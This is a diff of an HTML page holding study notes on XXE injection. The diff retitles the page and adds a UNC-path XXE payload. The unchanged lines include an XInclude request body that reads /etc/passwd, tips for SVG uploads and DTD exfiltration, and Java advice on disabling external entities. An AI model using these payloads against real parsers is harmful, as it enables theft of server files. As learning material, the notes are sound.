@@ -64,11 +64,11 @@
 
             <div class="nav__btns">
                 <!--Theme change button-->
-                <i class="uil uil-moon change-theme" id="theme-button"></i>
+                <!-- <i class="uil uil-moon change-theme" id="theme-button"></i>
 
                 <div class="nav__toggle" id="nav-toggle">
                     <i class="uil uil-apps"></i>
-                </div>
+                </div> -->
             </div>
         </nav>
     </header>
@@ -76,7 +76,7 @@
 
 
 <!--==================== MAIN ====================-->
-    <main class="main"><article id="9c601cbb-f44a-4b71-a2eb-d22c90b094dc" class="page sans"><header><h1 class="page-title">XML External Entities (XXE)</h1></header><div class="page-body"><ul id="0c6fff36-47d0-4ab6-a373-3c8f906a477b" class="bulleted-list"><li style="list-style-type:disc">Attacking systems that parse XML input</li></ul><ul id="725d3bd7-2996-480d-96a3-9d6b55dca6fd" class="bulleted-list"><li style="list-style-type:disc">Dos, LFI, RCE etc.</li></ul><ul id="fde60ac8-c63f-4ad6-99b3-fe4d4e577fed" class="bulleted-list"><li style="list-style-type:disc">XML basics</li></ul><pre id="ce93efdc-73b9-48d6-8a24-a17ed208608b" class="code"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISOBLAH&quot;
+    <main class="main"><article id="9c601cbb-f44a-4b71-a2eb-d22c90b094dc" class="page sans"><header><h1 class="page-title">XML External Entities Injection (XXE)</h1></header><div class="page-body"><ul id="0c6fff36-47d0-4ab6-a373-3c8f906a477b" class="bulleted-list"><li style="list-style-type:disc">Attacking systems that parse XML input</li></ul><ul id="725d3bd7-2996-480d-96a3-9d6b55dca6fd" class="bulleted-list"><li style="list-style-type:disc">Dos, LFI, RCE etc.</li></ul><ul id="fde60ac8-c63f-4ad6-99b3-fe4d4e577fed" class="bulleted-list"><li style="list-style-type:disc">XML basics</li></ul><pre id="ce93efdc-73b9-48d6-8a24-a17ed208608b" class="code"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISOBLAH&quot;
 &lt;!DOCTYPE gift [
 	&lt;!ENTITY from &quot;C:/Heath&amp;Amber&quot;&gt;
 ]&gt;
@@ -87,8 +87,7 @@
 	&lt;Item&gt;Cards&lt;/Item&gt;
 &lt;/gift&gt; </code></pre><ul id="c1879d70-c474-4b2d-8f8a-a995c02ea54e" class="bulleted-list"><li style="list-style-type:disc">google XXE Payloads<ul id="f00c5a09-3357-4c5d-9535-77fd19a8116d" class="bulleted-list"><li style="list-style-type:circle">Payloads all the things</li></ul></li></ul><ul id="73daf752-9e6d-4b99-97a3-d26f55128cde" class="bulleted-list"><li style="list-style-type:disc">We can put malicious characters in our entities that are banned in normal use</li></ul><ul id="3b60ec3f-6ffc-4636-8791-1e52da8ffbf4" class="bulleted-list"><li style="list-style-type:disc">File upload features</li></ul><ul id="101d7e97-2966-44c5-86b3-a23744ba4cbd" class="bulleted-list"><li style="list-style-type:disc">Bypassing whitelisted extensions</li></ul><p id="35437130-0aec-44dd-881b-72cbc7f2efe9" class="">
 </p><p id="9f3a7bfa-34ce-4e61-98e2-618a4d7ca1ba" class=""><strong>Prevention:</strong></p><h3 id="2fe1cff9-09b3-4024-8372-0380eede6729" class="">Disable XML External Entities</h3><p id="8168c846-bfc1-48ec-b9cf-f1ebd5eed12f" class="">This secure coding practice blocks <strong>XML External Entity attacks</strong></p><p id="1d67df55-e57c-4295-becf-16000bfe420b" class="">Unfortunately Java EE applications have a real problem with disabling XML External Entities. 
-They are turned on by default in the default DocumentBuilder and all other XML related capabilities: schema verification, transformation, etc.</p><p id="7f7dc43e-c582-455c-af70-1dec6308c82d" class="">There is also a multitude of open source parsers which have different configuration settings for turning off entities. 
-These parsers may be required by other open source components.</p><p id="4e57dbe4-eb33-48ff-9138-0dc5c89064eb" class="">Best approach is to disable all known resolving properties as seen below
+They are turned on by default in the default DocumentBuilder and all other XML related capabilities: schema verification, transformation, etc.</p><p id="7f7dc43e-c582-455c-af70-1dec6308c82d" class="">There is also a multitude of open source parsers which have different configuration settings for turning off entities. These parsers may be required by other open source components.</p><p id="4e57dbe4-eb33-48ff-9138-0dc5c89064eb" class="">Best approach is to disable all known resolving properties as seen below
  . The project should have a single XML DocumentBuilder constructor that
  turns off XXE and gets used everywhere.</p><pre id="5d7c40f5-74f4-4c96-9f07-9c68860965b0" class="code code-wrap"><code>
 public static final Collection XML_FEATURES_TO_DISABLE = Collections.unmodifiableList(Arrays.asList(
@@ -263,7 +262,12 @@ Connection: close
 productId=&lt;hack xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt; xi:include parse=&quot;text&quot;
 href-&quot;file:///etc/passwd&quot;/&gt;&lt;/hack&gt;&amp;storeId=1</code></pre><p id="8e909027-6da7-4a55-8763-9be3076daafd" class="">
 </p><p id="0e09f417-1027-4ee0-9ed4-542754e08e3a" class=""><strong>Repurposing local Dtds for data exfiltration:</strong></p><ul id="1c2f88b0-a488-40b9-8f44-666f3a53c51e" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/GoSecure/dtd-finder">https://github.com/GoSecure/dtd-finder</a></li></ul><pre id="ff51e87d-ae40-4941-be13-1dedc5f88cd6" class="code"><code></code></pre><p id="d337f9a7-1769-4c0f-b6d2-af1ae1413681" class="">
-</p><p id="fc2b00b7-bff8-415b-8142-84e2344dfa83" class=""><strong>XXE via SVG image:</strong></p><ul id="ce566fce-f6e3-445f-8d65-3f0a86b4f770" class="bulleted-list"><li style="list-style-type:disc">exploit file uploads since svg is just an xml image</li></ul><ul id="73fcff7c-3829-4491-87c4-e7dbcea4b66a" class="bulleted-list"><li style="list-style-type:disc">Replace the requests image xml with your xml then send it</li></ul></div></article></main></main>
+</p><p id="fc2b00b7-bff8-415b-8142-84e2344dfa83" class=""><strong>XXE via SVG image:</strong></p><ul id="ce566fce-f6e3-445f-8d65-3f0a86b4f770" class="bulleted-list"><li style="list-style-type:disc">exploit file uploads since svg is just an xml image</li></ul><ul id="73fcff7c-3829-4491-87c4-e7dbcea4b66a" class="bulleted-list"><li style="list-style-type:disc">Replace the requests image xml with your xml then send it</li></ul><p id="1673aa5e-0396-4e65-8fe6-8c9becfab482" class="">
+</p><p id="9a228f34-d694-4b42-bda9-89a120bdac6d" class=""><strong>XXE Chained with UNC path exploitation:</strong></p><pre id="d70bf38d-2209-4939-bde1-ae724245d7db" class="code"><code>&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:////0.0.0.0/test.txt&quot; &gt;]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre><p id="e844eaf0-575d-4114-983b-5e7ca31dd72d" class="">
+</p></div></article></main></main>
 
     <!--==================== FOOTER ====================-->
     <footer class="footer">
